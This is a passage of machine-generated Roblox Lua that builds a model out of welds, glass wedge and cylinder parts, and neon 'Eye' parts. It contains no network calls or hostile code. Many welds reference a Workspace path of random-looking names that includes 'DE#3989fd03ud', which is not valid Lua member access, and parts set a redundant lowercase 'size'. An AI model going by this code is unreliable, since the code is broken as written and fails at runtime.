local weld_11 = Instance.new("Weld")
weld_11.C0 = CFrame.fromMatrix(Vector3.new(0, 0, 0), Vector3.new(-1, 0, 8.742277657347586e-08), Vector3.new(0, 1, 0), Vector3.new(-8.742277657347586e-08, 0, -1))
weld_11.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_11.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Eye
weld_11.Parent = handle_2

local weld_12 = Instance.new("Weld")
weld_12.C0 = CFrame.fromMatrix(Vector3.new(0, 0, 0), Vector3.new(-0.7071068286895752, 0, 0.7071067094802856), Vector3.new(0, 1, 0), Vector3.new(-0.7071067094802856, 0, -0.7071068286895752))
weld_12.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_12.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Eye
weld_12.Parent = handle_2

local weld_13 = Instance.new("Weld")
weld_13.C0 = CFrame.fromMatrix(Vector3.new(0, 0, 0), Vector3.new(1.1924880638503055e-08, 0, 1), Vector3.new(0, 1, 0), Vector3.new(-1, 0, 1.1924880638503055e-08))
weld_13.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_13.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Eye
weld_13.Parent = handle_2

local weld_14 = Instance.new("Weld")
weld_14.C0 = CFrame.fromMatrix(Vector3.new(0, 0, 0), Vector3.new(0.7071067094802856, 0, 0.70710688829422), Vector3.new(0, 1, 0), Vector3.new(-0.70710688829422, 0, 0.7071067094802856))
weld_14.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_14.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Eye
weld_14.Parent = handle_2

local weld_15 = Instance.new("Weld")
weld_15.C0 = CFrame.fromMatrix(Vector3.new(0, 0, 0), Vector3.new(1, 0, -1.7484555314695172e-07), Vector3.new(0, 1, 0), Vector3.new(1.7484555314695172e-07, 0, 1))
weld_15.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_15.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Eye
weld_15.Parent = handle_2

local weld_16 = Instance.new("Weld")
weld_16.C0 = CFrame.fromMatrix(Vector3.new(0, -0.6000000238418579, 0.5), Vector3.new(1, 0, 0), Vector3.new(0, -4.371138828673793e-08, 1), Vector3.new(0, -1, -4.371138828673793e-08))
weld_16.Part0 = handle_2
weld_16.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Eye
weld_16.Parent = handle_2

local weld_17 = Instance.new("Weld")
weld_17.C0 = CFrame.fromMatrix(Vector3.new(0, -0.6000000238418579, 0.30000001192092896), Vector3.new(1, 0, 0), Vector3.new(0, -4.371138828673793e-08, 1), Vector3.new(0, -1, -4.371138828673793e-08))
weld_17.Part0 = handle_2
weld_17.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_17.Parent = handle_2

local weld_18 = Instance.new("Weld")
weld_18.C0 = CFrame.fromMatrix(Vector3.new(0, -0.699999988079071, 0.5), Vector3.new(1, 8.742278367890322e-08, -8.74227694680485e-08), Vector3.new(-8.742277657347586e-08, 4.371138118131057e-08, -1), Vector3.new(-8.742277657347586e-08, 1, 4.371138828673793e-08))
weld_18.Part0 = handle_2
weld_18.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_18.Parent = handle_2

local weld_19 = Instance.new("Weld")
weld_19.C0 = CFrame.fromMatrix(Vector3.new(0, -0.6000000238418579, 0.699999988079071), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
weld_19.Part0 = handle_2
weld_19.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_19.Parent = handle_2

local weld_20 = Instance.new("Weld")
weld_20.C0 = CFrame.fromMatrix(Vector3.new(0, -0.6000000238418579, 0.699999988079071), Vector3.new(0.08715987205505371, -0.9961955547332764, 0), Vector3.new(0.9961955547332764, 0.08715987205505371, 0), Vector3.new(0, 0, 1))
weld_20.Part0 = handle_2
weld_20.Part1 = eye
weld_20.Parent = handle_2

local weld_21 = Instance.new("Weld")
weld_21.C0 = CFrame.fromMatrix(Vector3.new(0, -0.6000000238418579, 1), Vector3.new(1, 0, 0), Vector3.new(0, -4.371138828673793e-08, 1), Vector3.new(0, -1, -4.371138828673793e-08))
weld_21.Part0 = handle_2
weld_21.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_21.Parent = handle_2

local weld_22 = Instance.new("Weld")
weld_22.C0 = CFrame.fromMatrix(Vector3.new(0, -0.6000000238418579, 1.100000023841858), Vector3.new(1, 0, 0), Vector3.new(0, -4.371138828673793e-08, 1), Vector3.new(0, -1, -4.371138828673793e-08))
weld_22.Part0 = handle_2
weld_22.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_22.Parent = handle_2

local weld_23 = Instance.new("Weld")
weld_23.C0 = CFrame.fromMatrix(Vector3.new(0, -0.550000011920929, 0.20000000298023224), Vector3.new(1, 0, 0), Vector3.new(0, -0.7071067690849304, -0.7071067690849304), Vector3.new(0, 0.7071067690849304, -0.7071067690849304))
weld_23.C1 = CFrame.fromMatrix(Vector3.new(0, -0.30000001192092896, 0), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
weld_23.Part0 = handle_2
weld_23.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_23.Parent = handle_2

local weld_24 = Instance.new("Weld")
weld_24.C0 = CFrame.fromMatrix(Vector3.new(0, -0.10000000149011612, 0.20000000298023224), Vector3.new(1, 0, 0), Vector3.new(0, -4.371138828673793e-08, 1), Vector3.new(0, -1, -4.371138828673793e-08))
weld_24.Part0 = handle_2
weld_24.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_24.Parent = handle_2

local weld_25 = Instance.new("Weld")
weld_25.C0 = CFrame.fromMatrix(Vector3.new(0, 0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 0.9902680516242981, 0.13917310535907745), Vector3.new(0, -0.13917310535907745, 0.9902680516242981))
weld_25.C1 = CFrame.fromMatrix(Vector3.new(0, -0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
weld_25.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_25.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_25.Parent = handle_2

local weld_26 = Instance.new("Weld")
weld_26.C0 = CFrame.fromMatrix(Vector3.new(0, 0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 0.9902680516242981, 0.13917310535907745), Vector3.new(0, -0.13917310535907745, 0.9902680516242981))
weld_26.C1 = CFrame.fromMatrix(Vector3.new(0, -0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
weld_26.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_26.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_26.Parent = handle_2

local weld_27 = Instance.new("Weld")
weld_27.C0 = CFrame.fromMatrix(Vector3.new(0, 0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 0.9902680516242981, 0.13917310535907745), Vector3.new(0, -0.13917310535907745, 0.9902680516242981))
weld_27.C1 = CFrame.fromMatrix(Vector3.new(0, -0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
weld_27.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_27.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_27.Parent = handle_2

local weld_28 = Instance.new("Weld")
weld_28.C0 = CFrame.fromMatrix(Vector3.new(0, 0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 0.9902680516242981, 0.13917310535907745), Vector3.new(0, -0.13917310535907745, 0.9902680516242981))
weld_28.C1 = CFrame.fromMatrix(Vector3.new(0, -0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
weld_28.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_28.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_28.Parent = handle_2

local weld_29 = Instance.new("Weld")
weld_29.C0 = CFrame.fromMatrix(Vector3.new(0, 0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 0.9902680516242981, 0.13917310535907745), Vector3.new(0, -0.13917310535907745, 0.9902680516242981))
weld_29.C1 = CFrame.fromMatrix(Vector3.new(0, -0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
weld_29.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_29.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_29.Parent = handle_2

local weld_30 = Instance.new("Weld")
weld_30.C0 = CFrame.fromMatrix(Vector3.new(0, 0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 0.9902680516242981, 0.13917310535907745), Vector3.new(0, -0.13917310535907745, 0.9902680516242981))
weld_30.C1 = CFrame.fromMatrix(Vector3.new(0, -0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
weld_30.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_30.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_30.Parent = handle_2

local weld_31 = Instance.new("Weld")
weld_31.C0 = CFrame.fromMatrix(Vector3.new(0, 0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 0.9902680516242981, 0.13917310535907745), Vector3.new(0, -0.13917310535907745, 0.9902680516242981))
weld_31.C1 = CFrame.fromMatrix(Vector3.new(0, -0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
weld_31.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_31.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_31.Parent = handle_2

local weld_32 = Instance.new("Weld")
weld_32.C0 = CFrame.fromMatrix(Vector3.new(0, 0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 0.9902680516242981, 0.13917310535907745), Vector3.new(0, -0.13917310535907745, 0.9902680516242981))
weld_32.C1 = CFrame.fromMatrix(Vector3.new(0, -0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
weld_32.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_32.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_32.Parent = handle_2

local weld_33 = Instance.new("Weld")
weld_33.C0 = CFrame.fromMatrix(Vector3.new(0, 0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 0.9902680516242981, 0.13917310535907745), Vector3.new(0, -0.13917310535907745, 0.9902680516242981))
weld_33.C1 = CFrame.fromMatrix(Vector3.new(0, -0.02500000037252903, 0), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
weld_33.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_33.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_33.Parent = handle_2

local weld_34 = Instance.new("Weld")
weld_34.C0 = CFrame.fromMatrix(Vector3.new(0, -0.6000000238418579, 0.699999988079071), Vector3.new(1, 0, 0), Vector3.new(0, -4.371138828673793e-08, 1), Vector3.new(0, -1, -4.371138828673793e-08))
weld_34.Part0 = handle_2
weld_34.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_34.Parent = handle_2

local weld_35 = Instance.new("Weld")
weld_35.C0 = CFrame.fromMatrix(Vector3.new(0, -0.6000000238418579, 0.699999988079071), Vector3.new(0.08715987205505371, 0.9961955547332764, 0), Vector3.new(-0.9961955547332764, 0.08715987205505371, 0), Vector3.new(0, 0, 1))
weld_35.Part0 = handle_2
weld_35.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_35.Parent = handle_2

local weld_36 = Instance.new("Weld")
weld_36.C0 = CFrame.fromMatrix(Vector3.new(0, 2.450000047683716, 0), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
weld_36.Part0 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_36.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Hole
weld_36.Parent = handle_2

local weld_37 = Instance.new("Weld")
weld_37.C0 = CFrame.fromMatrix(Vector3.new(0, -0.6000000238418579, 3), Vector3.new(1, 0, 0), Vector3.new(0, -4.371138828673793e-08, 1), Vector3.new(0, -1, -4.371138828673793e-08))
weld_37.Part0 = handle_2
weld_37.Part1 = game.Workspace.MainModule.jirocwtfoqieoeqwpriqeworiqwr.reiucuywicjqrojwqo.rerkioewiroewureorf.uieryweiyrdqiwwqoidq.irofociukwijofdwfjwod.DE#3989fd03ud.Model.Part
weld_37.Parent = handle_2

local part = Instance.new("Part")
part.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part.CFrame = CFrame.fromMatrix(Vector3.new(-2.871838092803955, 21.94728660583496, 17.32278060913086), Vector3.new(-0.9659236669540405, -0.0000012015241281915223, 0.25881853699684143), Vector3.new(-0.2588185966014862, -0.000007965005352161825, -0.9659243226051331), Vector3.new(0.000003060355084016919, -0.9999988079071045, 0.000005417909960669931))
part.Color = Color3.new(0.517647, 0.517647, 0.517647)
part.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part.Material = Enum.Material.Glass
part.Orientation = Vector3.new(89.91200256347656, 29.459999084472656, -171.4219970703125)
part.Rotation = Vector3.new(90, 0, 165)
part.Size = Vector3.new(0.20000000298023224, 0.5, 0.20000000298023224)
part.size = Vector3.new(0.20000000298023224, 0.5, 0.20000000298023224)
part.Parent = model

local mesh_49 = Instance.new("SpecialMesh")
mesh_49.MeshType = Enum.MeshType.Wedge
mesh_49.Parent = part

local part_2 = Instance.new("Part")
part_2.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_2.CFrame = CFrame.fromMatrix(Vector3.new(-2.8459556102752686, 21.74728775024414, 17.419374465942383), Vector3.new(-0.9659236669540405, -0.0000012889461231679888, 0.2588186264038086), Vector3.new(0.25881868600845337, 0.000007965005352161825, 0.9659243226051331), Vector3.new(-0.0000031447987112187548, 0.9999988079071045, -0.000005395283551479224))
part_2.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_2.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_2.Material = Enum.Material.Glass
part_2.Orientation = Vector3.new(-89.91200256347656, -149.76300048828125, -9.192000389099121)
part_2.Rotation = Vector3.new(-90, 0, -165)
part_2.Size = Vector3.new(0.20000000298023224, 0.30000001192092896, 0.20000000298023224)
part_2.size = Vector3.new(0.20000000298023224, 0.30000001192092896, 0.20000000298023224)
part_2.Parent = model

local mesh_50 = Instance.new("SpecialMesh")
mesh_50.MeshType = Enum.MeshType.Wedge
mesh_50.Parent = part_2

local part_3 = Instance.new("Part")
part_3.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_3.CFrame = CFrame.fromMatrix(Vector3.new(-2.8200745582580566, 21.947288513183594, 17.515966415405273), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(-0.2588185966014862, -0.000007965005352161825, -0.9659243226051331), Vector3.new(-0.0000031447987112187548, 0.9999988079071045, -0.000005395283551479224))
part_3.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_3.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_3.Material = Enum.Material.Glass
part_3.Orientation = Vector3.new(-89.91200256347656, -149.76300048828125, 170.80799865722656)
part_3.Rotation = Vector3.new(-90, 0, 15)
part_3.Size = Vector3.new(0.30000001192092896, 0.30000001192092896, 0.30000001192092896)
part_3.size = Vector3.new(0.30000001192092896, 0.30000001192092896, 0.30000001192092896)
part_3.Parent = model

local part_4 = Instance.new("Part")
part_4.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_4.CFrame = CFrame.fromMatrix(Vector3.new(-2.7941935062408447, 22.24728775024414, 17.61255645751953), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(-0.2588185966014862, -0.000007965005352161825, -0.9659243226051331), Vector3.new(-0.0000031447987112187548, 0.9999988079071045, -0.000005395283551479224))
part_4.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_4.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_4.Material = Enum.Material.Glass
part_4.Orientation = Vector3.new(-89.91200256347656, -149.76300048828125, 170.80799865722656)
part_4.Rotation = Vector3.new(-90, 0, 15)
part_4.Size = Vector3.new(0.30000001192092896, 0.5, 0.5)
part_4.size = Vector3.new(0.30000001192092896, 0.5, 0.5)
part_4.Parent = model

local part_5 = Instance.new("Part")
part_5.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_5.CFrame = CFrame.fromMatrix(Vector3.new(-2.7941935062408447, 22.24728775024414, 17.61255645751953), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(0.2588185966014862, 0.000007921294127299916, 0.9659243226051331))
part_5.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_5.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_5.Material = Enum.Material.Glass
part_5.Orientation = Vector3.new(0, 15, 0)
part_5.Rotation = Vector3.new(0, 15, 0)
part_5.Size = Vector3.new(0.4000000059604645, 0.4000000059604645, 0.4000000059604645)
part_5.size = Vector3.new(0.4000000059604645, 0.4000000059604645, 0.4000000059604645)
part_5.Parent = model

local mesh_51 = Instance.new("CylinderMesh")
mesh_51.Parent = part_5

local eye_2 = Instance.new("Part")
eye_2.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
eye_2.CFrame = CFrame.fromMatrix(Vector3.new(-2.7941935062408447, 22.24728775024414, 17.61255645751953), Vector3.new(0.4999988079071045, -0.000004689778052124893, -0.8660240173339844), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(0.8660235404968262, 0.000006512623713206267, 0.4999993145465851))
eye_2.Color = Color3.new(0.517647, 0.517647, 0.517647)
eye_2.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
eye_2.Material = Enum.Material.Neon
eye_2.Orientation = Vector3.new(0, 60, 0)
eye_2.Rotation = Vector3.new(-0.0010000000474974513, 60, 0)
eye_2.Size = Vector3.new(0.05000000074505806, 0.3499999940395355, 0.4099999964237213)
eye_2.size = Vector3.new(0.05000000074505806, 0.3499999940395355, 0.4099999964237213)
eye_2.Name = "Eye"
eye_2.Parent = model

local eye_3 = Instance.new("Part")
eye_3.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
eye_3.CFrame = CFrame.fromMatrix(Vector3.new(-2.7941935062408447, 22.24728775024414, 17.61255645751953), Vector3.new(-0.2588186264038086, -0.000007921294127299916, -0.9659243226051331), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(0.9659236669540405, 0.000001288946464228502, -0.2588185667991638))
eye_3.Color = Color3.new(0.517647, 0.517647, 0.517647)
eye_3.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
eye_3.Material = Enum.Material.Neon
eye_3.Orientation = Vector3.new(0, 105, 0)
eye_3.Rotation = Vector3.new(180, 75, 179.99899291992188)
eye_3.Size = Vector3.new(0.05000000074505806, 0.3499999940395355, 0.4099999964237213)
eye_3.size = Vector3.new(0.05000000074505806, 0.3499999940395355, 0.4099999964237213)
eye_3.Name = "Eye"
eye_3.Parent = model

local eye_4 = Instance.new("Part")
eye_4.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
eye_4.CFrame = CFrame.fromMatrix(Vector3.new(-2.7941935062408447, 22.24728775024414, 17.61255645751953), Vector3.new(-0.8660235404968262, -0.000006512623713206267, -0.4999993145465851), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(0.4999988079071045, -0.000004689778052124893, -0.8660240173339844))
eye_4.Color = Color3.new(0.517647, 0.517647, 0.517647)
eye_4.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
eye_4.Material = Enum.Material.Neon
eye_4.Orientation = Vector3.new(0, 150, 0)
eye_4.Rotation = Vector3.new(180, 30, 180)
eye_4.Size = Vector3.new(0.05000000074505806, 0.3499999940395355, 0.4099999964237213)
eye_4.size = Vector3.new(0.05000000074505806, 0.3499999940395355, 0.4099999964237213)
eye_4.Name = "Eye"
eye_4.Parent = model

local eye_5 = Instance.new("Part")
eye_5.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
eye_5.CFrame = CFrame.fromMatrix(Vector3.new(-2.7941935062408447, 22.24728775024414, 17.61255645751953), Vector3.new(-0.9659236669540405, -0.0000012889461231679888, 0.2588186264038086), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(-0.25881868600845337, -0.000007921294127299916, -0.9659243226051331))
eye_5.Color = Color3.new(0.517647, 0.517647, 0.517647)
eye_5.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
eye_5.Material = Enum.Material.Neon
eye_5.Orientation = Vector3.new(0, -165, 0)
eye_5.Rotation = Vector3.new(180, -15, 180)
eye_5.Size = Vector3.new(0.05000000074505806, 0.3499999940395355, 0.4099999964237213)
eye_5.size = Vector3.new(0.05000000074505806, 0.3499999940395355, 0.4099999964237213)
eye_5.Name = "Eye"
eye_5.Parent = model

local eye_6 = Instance.new("Part")
eye_6.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
eye_6.CFrame = CFrame.fromMatrix(Vector3.new(-2.7941935062408447, 22.24728775024414, 17.61255645751953), Vector3.new(-0.49999886751174927, 0.0000046897771426301915, 0.8660239577293396), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(-0.8660235404968262, -0.000006512624167953618, -0.49999940395355225))
eye_6.Color = Color3.new(0.517647, 0.517647, 0.517647)
eye_6.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
eye_6.Material = Enum.Material.Neon
eye_6.Orientation = Vector3.new(0, -120, 0)
eye_6.Rotation = Vector3.new(179.99899291992188, -60, 180)
eye_6.Size = Vector3.new(0.05000000074505806, 0.3499999940395355, 0.4099999964237213)
eye_6.size = Vector3.new(0.05000000074505806, 0.3499999940395355, 0.4099999964237213)
